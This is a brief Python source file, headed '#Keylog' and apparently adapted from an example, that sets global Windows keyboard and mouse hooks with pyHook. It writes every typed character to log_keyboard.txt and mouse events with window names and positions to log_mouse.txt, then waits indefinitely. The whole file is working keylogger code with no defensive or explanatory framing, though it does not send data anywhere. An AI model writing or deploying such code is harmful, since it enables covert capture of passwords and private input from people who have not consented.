#from exemple
from __future__ import print_function

#Keylog

import pyHook, pythoncom, sys, logging, time

log_keyboard='log_keyboard.txt'
log_mouse='log_mouse.txt'
data=''
wait_time=0

fkeys=open(log_keyboard,'w')
fmouse=open(log_mouse,'w')

def onKeyboardEvent(event):
    global data
    if event.Ascii==13:
        data=data+'<ENTER>'
    elif event.Ascii==8:
        data=data+'<BACK SPACE>'
    elif event.Ascii==9:
        data=data+'<TAB>'
    else:
        data=data+chr(event.Ascii) 
    if len(data)>100:
        fkeys=open(log_keyboard,'w')
        fkeys.write(data+'\n')
        fkeys.close()
    return True
    return data


def OnMouseEvent(event):
    global wait_time
    start_time = time.time()
    Timediff=start_time-wait_time
    if int(Timediff)>2:
        fmouse.write('MessageName:'+str(event.MessageName)+'\n')
        fmouse.write('Message:'+str(event.Message)+'\n')
        fmouse.write('Time:'+str(event.Time)+'\n')
        fmouse.write('Window:'+str(event.Window)+'\n')
        fmouse.write('WindowName:'+str(event.WindowName)+'\n')
        fmouse.write('Position:'+str(event.Position)+'\n')
        fmouse.write('Wheel:'+str(event.Wheel)+'\n')
        fmouse.write('Injected:'+str(event.Injected)+'\n')
        fmouse.write('---'+'\n')
        wait_time=time.time()
        print('check')
        return wait_time
    else:
        pass

    #return True to pass the event to other handlers
    return True

#create a hook manager
hook_manager = pyHook.HookManager()
#watch for all mouse events
hook_manager.MouseAll = OnMouseEvent
#watch for all keyboard events
hook_manager.KeyDown = onKeyboardEvent
#set the hook mouse
hook_manager.HookMouse()
#set the hook keyboard
hook_manager.HookKeyboard()
#wait forever
pythoncom.PumpMessages()

